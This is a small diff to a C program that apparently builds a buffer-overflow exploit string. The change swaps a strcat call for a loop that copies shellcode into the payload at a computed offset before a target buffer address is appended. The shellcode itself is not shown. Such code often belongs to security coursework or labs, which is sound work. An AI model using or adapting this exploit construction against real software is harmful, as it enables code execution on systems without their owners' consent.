@@ -29,7 +29,10 @@ main ( int argc, char * argv[] )
 	}
 
 	// Append the shellcode
-	strcat(sploit_str, shellcode);
+	for (int i = 0; i < shellcode_len; ++i)
+	{
+		sploit_str[(sploit_len - shellcode_len - 4) + i] = shellcode[i];
+	}
 
 	// Append the target buffer address
 	strcat(sploit_str, target_addr);
